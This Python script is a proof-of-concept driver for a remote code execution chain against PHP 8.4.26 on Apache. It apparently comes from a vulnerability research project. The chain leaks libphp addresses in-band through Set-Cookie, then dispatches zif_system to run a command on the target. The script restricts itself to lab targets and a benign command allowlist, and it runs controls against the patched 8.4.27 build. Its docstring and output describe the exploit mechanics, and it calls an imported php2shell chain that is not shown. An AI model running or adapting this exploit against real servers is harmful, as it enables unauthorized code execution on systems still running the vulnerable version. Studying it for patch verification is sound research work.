#!/usr/bin/env python3
"""Un-instrumented core chain — CVE-2026-109619 (9bie ladder), reimplemented.

Runs the full A1 -> B1 (in-band leak) -> A2 -> B2 (zif_system dispatch)
chain against the stock `php:8.4.26-apache` lab, with the fixed benign
command allowlist and no debugger / no oracle.

Milestones (see docs/STATUS.md and the Track-B plan):
  M2  >64-byte Set-Cookie disclosure + libphp base derived in-band
  M3  zif_system fires from leaked addresses; patched 8.4.27 must block

Usage:
  # positive control (must fire):
  (cd lab-pure-modphp && docker compose up -d pure)
  python3 poc/verify_109619_remote.py --target 127.0.0.1:18120 \
      --proof lab-pure-modphp/out/p1 --cmd id

  # negative control (must NOT fire):
  (cd lab-pure-modphp && docker compose up -d purepatched)
  python3 poc/verify_109619_remote.py --target 127.0.0.1:18121 \
      --proof lab-pure-modphp/out/p1 --cmd id

Lab targets only; `id | uname | whoami` only. The proof command is fixed as
`<cmd>>/out/p1` inside the container.
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import probe, remote
from php2shell.guard import ALLOWED_CMDS, check_cmd

MARKERS = {"id": b"uid=", "uname": b"Linux", "whoami": b"www-data"}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18120")
    ap.add_argument("--workers", type=int, default=150,
                    help="prefork MaxRequestWorkers on the target")
    ap.add_argument("--cmd", default="id", choices=ALLOWED_CMDS)
    ap.add_argument("--proof", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-pure-modphp", "out", "p1"),
        help="host-side path of the container's /out/p1 proof file")
    ap.add_argument("--arch", choices=["auto", "x86_64", "aarch64"],
                    default="auto")
    ap.add_argument("--build", default=None,
                    help="PHP version for the per-build profile registry "
                         "(e.g. 8.4.26); default: arch profile")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="shift the dispatched zif_system by this amount "
                         "(load-bearing control: a non-zero bias must fail)")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    cmd = check_cmd(args.cmd)

    # clear any stale proof so no prior run can satisfy the verdict
    try:
        if os.path.exists(args.proof):
            os.remove(args.proof)
    except OSError:
        pass

    print("[*] Un-instrumented core chain (CVE-2026-109619)")
    print(f"    target: {host}:{port}  workers: {args.workers}  cmd: {cmd!r}"
          + (f"  build: {args.build}" if args.build else ""))
    print(f"    proof: {args.proof}")

    res = remote.run_chain(
        host, port,
        workers=args.workers,
        cmd=f"{cmd}>/out/p1",
        proof_host=args.proof,
        retries=args.retries,
        arch=args.arch,
        build=args.build,
        bias_zif=args.bias_zif,
        report=lambda m: print(f"    {m}"),
    )

    print()
    if res.get("rce"):
        out = res["output"]
        print(f"    libphp base: {res['lib']:#x}")
        print(f"    main chunk:  {res['main']:#x}")
        print(f"    zif_system:  {res['zif']:#x}")
        print(f"    decoded:     {res['decoded']} bytes")
        print(f"    output:      {out}")
        if MARKERS[cmd] in out.encode("latin-1"):
            print()
            print("[EVIDENCE] UN-INSTRUMENTED CORE RCE REPRODUCED")
            print("    - libphp + chunk base were leaked in-band (Set-Cookie);")
            print("    - zif_system dispatched the fixed benign command;")
            print("    - no [UAFDBG] oracle, no gdb, no docker-log access.")
            print("    - (M2 + M3 of the Track-B plan.)")
            return 0
        print("[!] proof file written but marker not found; inspect", args.proof)
        return 1
    print("[!] chain did not fire.")
    print("    On the positive lab this is unexpected; check the pinned worker,")
    print("    the /out mount, and whether `display_errors`/heap layout differ.")
    print("    On the PATCHED 8.4.27 lab, this is the EXPECTED negative control:")
    print("    the leak (B1) fails because the OOM bailout no longer leaves")
    print("    PS(id) dangling, so no in-band addresses are recovered and the")
    print("    fire stage has nothing to dispatch.")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())